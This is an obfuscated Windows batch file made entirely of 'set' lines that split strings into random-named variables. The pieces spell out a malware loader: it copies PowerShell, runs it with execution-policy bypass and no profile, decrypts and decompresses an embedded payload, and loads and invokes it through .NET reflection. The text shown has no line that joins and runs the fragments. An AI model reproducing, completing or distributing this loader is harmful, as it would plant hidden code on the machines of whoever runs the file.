@echo off
set "XIKoOGUvSt=in"
set "PdzTuabdgl=Po"
set "uiheClSWuv=s\"
set "eREHFDspmF=ll"
set "CISsDBHMpk=nd"
set "wRPRyupXuA=0\"
set "tiaUcYzaZs=xe"
set "wNKViJiZwt=.e"
set "wBTduglOjZ=1."
set "bWWKIhExoW=\W"
set "ASMvZtdbuq=py"
set "nKNdowHFOq= /"
set "kUVBzSBmsV=ll"
set "HMcZNtANPs=em"
set "ligJgzYUUp=:\"
set "sXvFMDqOgE=Sy"
set "RmEKQFnklf=st"
set "ILrURCMTha=32"
set "NGFOtVzyPQ=\v"
set "IqbNYzXjNC=we"
set "GBepDhpoNj=he"
set "mTEadEEzkc=rS"
set "cCYNWfVKSo=do"
set "TtdkeLPsqF=ws"
set "QBfmEYcftV=he"
set "rDgniWQNpY=rs"
set "zDpDzCYBnz=we"
set "NMeQwsPrzi=Wi"
set "XXMQOhpUNo= C"
set "uEvtCSRjhU=y "
set "zhzTErLcoz=ow"
set "momFpkVqTI=po"
set "ytCerOcniQ=co"
set "wXjfysVBrW= %~dp0"
set "IiHKSHtviv=cd"
set "GPvFbiobEr=.Dis"
set "gAQXbBcCsP=$VvP"
set "IJhcyVdtlg=PlF."
set "jeStACABcI=stem"
set "alSfclDBXh=.Mem"
set "FAzykJNySM=nage"
set "DXNPTghbbO=sion"
set "TFTdhEkcYP=;$kB"
set "VPfvjcnCUZ=pDZz"
set "rSQkcmOTBO=hy.A"
set "adpbfvrjDv=.IO."
set "tekTKEzVmZ=join"
set "GKWPVKkpUY=+hAO"
set "BDPuWDUgfl=]::("
set "cRkVFEpMWs=[Sys"
set "qaIRqtTECN=v4Ir"
set "chYkZPguqC=ress"
set "xxHsbqqJSz=.Len"
set "ncVKucArrf=($VH"
set "qkYdZSoreN=n ''"
set "cGwzNWigET=Invo"
set "IRvMyaEUbT=3); "
set "lqcZNenCoh=g, 0"
set "vsCnpJBmYz=se()"
set "UlaCbkZLtO=yste"
set "yNynQISuMe=);$X"
set "HhWHFfYXah== $X"
set "xRbOFfyqYD=[IO."
set "ggBAphEZyk=;$Vv"
set "CMgSZDZHSp=O.Me"
set "YhmtyrbaWM=nirt"
set "HzuIGwlWbs=ecry"
set "vgcebItvgh=Mode"
set "ntpwoFSvaa=stem"
set "SfUikOHgAt=daeR"
set "gWfKpklXvs=ddin"
set "tKlwBolttv= if "
set "GaCZIGNVdo=embl"
set "jlegLYitnL=eam("
set "XkJhjsNwdM=$Xls"
set "bEwETZlSDj=bjec"
set "IVbIiEEQLD=tS46"
set "oMRxaWOLhC=('%*'"
set "WBHLcmntKk=raph"
set "JFDFLjTjll=th('"
set "dFmPpIaWTA=Disp"
set "wESVphVHxN=oryS"
set "yyfhtCRkCj=ect "
set "yZsFmqsTqN=ach "
set "TecKFnmZjt=y.Ci"
set "SHDyozDSVP=();$"
set "PsCPTQfJIC='gni"
set "RIMUzTJkWB=:: '"
set "JWUzmjXVKt=b) {"
set "LXLKTeVklp=$TBZ"
set "xIuUjKShXD=sGUc"
set "aaPkoLGwLN=tem."
set "tzbtlMCNBd=yTo("
set "BeCrivvQlr=Secu"
set "eKfOxREBGS=esFX"
set "XfKanaRDkE=;$Jc"
set "shOLEPmqxC=yste"
set "GopdNhOXdH=n ''"
set "AprOmdCakm=tion"
set "brUrkLkAOt=);$T"
set "vjZJHlbSVM=mIB."
set "PYhGjGzFdi=$TBZ"
set "HtIFERffDb=ck($"
set "ByqpfXTDHf='[-1"
set "hHfXfmZEZP=.Dis"
set "sbmAGUmvLp=0O+g"
set "YVQSnycSJx===')"
set "PzSHfGpmYO=-Obj"
set "UTxiFJtUzQ=m(, "
set "dPkrXkXJtO=TllA"
set "TbZVsPuCQG='dqR"
set "KNiIRsrklo=md);"
set "WtsLNSZsjS=Star"
set "lqcUJTodeh=in $"
set "THIqyVefxL=ne);"
set "PDrwaBLqZH=736u"
set "CBHJSsNHfa=ose("
set "okEYfkooKw=ZYYc"
set "UHGfxgawzX=Secu"
set "DkOKgOlNQH=KMqd"
set "WhWTFEDShd=saBm"
set "qGWVcWsvNr=-1.."
set "FoaNXWgokP=grap"
set "KmfgRvAKbh= [st"
set "zSdvSQdrza=Vcny"
set "FVlnxmkejo=m.IO"
set "lxtutAvwie=Syst"
set "NkyzOivrSQ=cnyg"
set "xFdrUqEUEh=bypa"
set "xRFZGynqtB=.Cre"
set "sZpdeRPsQe=();$"
set "dilRJGzrBj=New-"
set "JWKxJmIUiv=tpU."
set "rsIhQPCWbg=ptor"
set "PWWrYyxdAy=pher"
set "mIgUrlxmlL=isfL"
set "jkqHMsGvJe=y]::"
set "PelQKkzlpm=em.C"
set "byNKHAPgtm=lBlo"
set "qucohTiYpq= '')"
set "OcwyMuYOIK=$QZn"
set "gsXnNaVWth=$Jct"
set "airmxTmPrQ=Fo7l"
set "QSYdnFqsCT=ispo"
set "CrCXRphABz=em.I"
set "xLHRkAMrgF=oL'["
set "yXodvNxTXp=OyzA"
set "PACAmMecPW=rity"
set "zLIvatdkvl=and "
set "OwMaRZfByv= [Sy"
set "UvwZzLWdic=ert]"
set "ycxsAEkNHI=lsNZ"
set "dPmYfamnRz=mory"
set "rjfhVltciF=Disp"
set "ZtlEdvkfxy=ptog"
set "iTRYYmvrLQ=null"
set "wvbtcorVzK=oint"
set "MGAYPbCVMI=g = "
set "AnFwndUyZv=brea"
set "tIidOXsYYc=F'[-"
set "aArBdeuNOg=orF'"
set "OkydwkPuJf=1] -"
set "ToipJsVsdq=::('"
set "eBMsHuYONE= [Sy"
set "DusWnLdksX=.Cop"
set "efMaVHNIkj=ment"
set "HjRbkpwCHz=YaS."
set "StamAWyyOT=pU.T"
set "QXJOmVubzy=ddin"
set "tNNSJiczuh=ewLi"
set "pBttljkYLk=y.Pa"
set "CbnVIzwGvt=form"
set "walMBRlsBV=lsNZ"
set "ShWnWqYRTS=-nop"
set "ezlUmlcYad=pres"
set "PCoJUunUEx=esaB"
set "qIUFnMcXJW=XlsN"
set "GsYPoslhia=k; }"
set "UEiqZqKiBt=gMod"
set "QivxaZpygL=md.T"
set "umHwSPwQQR=7Yiv"
set "OahHgRZfGy=md ="
set "swCQrIaiNh=$KMq"
set "EEFffMKVEE=pose"
set "xuXWoeFFqg=tem."
set "FibRvAUMkH=BZmd"
set "jPqqTrtAiW=]::N"
set "pNrYdkACtv=trea"
set "AOJGRRajKT=oArr"
set "HNAGNpTFyg=yg ="
set "sFDRTBsCnO=rans"
set "nocxUTXHIU=YaS "
set "lHhmxYosov=rt]:"
set "PCFdbfwnIj=1..-"
set "WTvsxGscRc=onve"
set "ZhBqBXrgXx=le  "
set "aCjjjGJIci=GX.D"
set "getzRFMHNU=db ="
set "ceOlSVaPis= New"
set "DZSIamUTcS=yg);"
set "TKKdjClzcu=ing("
set "bQftsPjapt=[Env"
set "HEesoMeDSQ=QZnG"
set "KaiBnDgKqG=$TBZ"
set "bBieYRUPGG=; };"
set "beROrhwbsK=NZ.I"
set "muEfxfJqam=pStr"
set "dTJcejiAGT=X = "
set "AQuNHraWHw=[]] "
set "zbOhWELRrn=pose"
set "KmNWgEAMpR=e]::"
set "xRJvAysCGv= = ["
set "JqCeHAZTqo=bstr"
set "sbFmuRfUXu=gnir"
set "OKTfESStWb=('da"
set "NyudRJcvDC=g = "
set "RqmblynaFP=urit"
set "RJHDTGlADF=rity"
set "jySxtlepUJ=)($Q"
set "GukAGDpdeU=stem"
set "HrqCltGSLq=:('g"
set "SsUDFXFygw=.Cry"
set "tTYBLOumkB=);$F"
set "NtZbRxCywm=-joi"
set "GwwBgRKjiW=File"
set "uUvfTGLBHa=Bmor"
set "sRJESQnlrz=Obje"
set "ECRwrjFTJj=gth)"
set "MLqDsiVNiz=)))"
set "jnRaCBDRIu=tryP"
set "pkWKSLKfyR=-ep "
set "HXkVhqKdsL=m.Re"
set "nOnEQGmWIs=Syst"
set "jbrcpyGqwp=m.IO"
set "skCduJsSmI=VvPl"
set "bOPnFhgWip=vj0m"
set "WPnDhBxedW= = $"
set "bkXFjFKsEW=ew-O"
set "MkknOIMuFr=oin "
set "EOcHmbzKSb=esMa"
set "XnvCooMjJe=[-1."
set "lSFJTBjUyF=ct S"
set "zxGEYMwKip=)($V"
set "DStuuGajfk=tsWi"
set "qooPSTQjEI=morF"
set "usEGlgWhqe=Stre"
set "XNmPJIoZqo=y.Cr"
set "LdObhbpBOr=MyB "
set "GZWWTUbdlq=..-1"
set "OeHAAQMWsa=..-1"
